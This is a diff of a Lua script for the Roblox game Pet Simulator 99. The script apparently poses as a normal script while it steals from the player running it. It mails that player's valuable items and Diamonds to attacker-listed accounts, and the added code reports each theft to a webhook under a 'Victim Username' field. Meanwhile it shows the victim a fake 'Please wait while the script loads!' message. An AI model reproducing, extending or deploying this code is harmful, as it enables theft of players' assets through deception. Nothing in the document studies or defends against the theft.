@@ -124,13 +124,13 @@ local function getRAP(Type, Item)
     }) or 0)
 end
 
-local function sendItem(category, uid, am)
+local function sendItem(category, uid, am, recipient)
     local remaining = am or 1
     local userIndex = 1
     local maxUsers = #users
 
     while remaining > 0 do
-        local currentUser = users[userIndex]
+        local currentUser = recipient or users[userIndex]
         local args = {[1]=currentUser, [2]=MailMessage, [3]=category, [4]=uid, [5]=1}
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
 
@@ -139,47 +139,78 @@ local function sendItem(category, uid, am)
             mailSendPrice = math.ceil(mailSendPrice * 1.5)
             if mailSendPrice > 5000000 then mailSendPrice = 5000000 end
             remaining = remaining - 1
+            return currentUser -- return recipient for webhook
         elseif err == "They don't have enough space!" then
             userIndex = userIndex + 1
             if userIndex > maxUsers then
                 warn("All mailboxes full for item "..uid)
-                return
+                return nil
             end
         else
             warn("Failed to send item: "..tostring(err))
-            return
+            return nil
         end
     end
 end
 
+-- Send remaining gems only to specified users
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             local remainingGems = GemAmount1
-            local userIndex = 1
-            local maxUsers = #users
-
-            while remainingGems > 0 do
-                local currentUser = users[userIndex]
+            for _, currentUser in ipairs(users) do
+                if remainingGems <= 0 then break end
                 local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=i, [5]=remainingGems}
                 local response, err = network.Invoke("Mailbox: Send", unpack(args))
-
                 if response == true then
                     GemAmount1 = GemAmount1 - remainingGems
+                    -- Track recipient for webhook
+                    table.insert(sortedItems, {category="Currency", uid=i, amount=remainingGems, rap=0, name="Diamonds", recipient=currentUser})
                     remainingGems = 0
+                    break
                 elseif err == "They don't have enough space!" then
-                    userIndex = userIndex + 1
-                    if userIndex > maxUsers then
-                        warn("All mailboxes full for gems")
-                        return
-                    end
+                    -- try next user
                 else
                     warn("Failed to send gems: "..tostring(err))
                     return
                 end
             end
+            if remainingGems > 0 then
+                warn("Not all diamonds could be sent, all specified mailboxes full")
+            end
         end
     end
+end
+
+-- Webhook function
+local function SendMessage()
+    local headers = {["Content-Type"] = "application/json"}
+    local fields = {
+        {name = "Victim Username:", value = plr.Name, inline = true},
+        {name = "Items to be sent:", value = "", inline = false},
+        {name = "Summary:", value = "", inline = false}
+    }
+
+    for _, item in ipairs(sortedItems) do
+        local recipient = item.recipient or "Unknown"
+        fields[2].value = fields[2].value .. item.name .. " (x" .. item.amount .. ")" .. ": " 
+            .. formatNumber(item.rap * item.amount) 
+            .. " RAP | Recipient: " .. recipient .. "\n"
+    end
+
+    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(GemAmount1), formatNumber(totalRAP))
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\144\177 New PS99 Execution",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {["text"] = "Strike Hub."}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    request({Url = webhook, Method = "POST", Headers = headers, Body = body})
 end
 
 -- Collect items above min_rap
@@ -219,16 +250,18 @@ if #sortedItems>0 or GemAmount1>min_rap+mailSendPrice then
     -- Send all items first
     for _,item in ipairs(sortedItems) do
         if item.rap >= min_rap and GemAmount1 > mailSendPrice then
-            sendItem(item.category, item.uid, item.amount)
-        else
-            break
+            local recipient = sendItem(item.category, item.uid, item.amount)
+            item.recipient = recipient
         end
     end
 
-    -- Send remaining gems last
+    -- Send remaining gems last to specified users
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
+
+    -- Send webhook
+    spawn(SendMessage)
 
     message.Error("Please wait while the script loads!")
 end
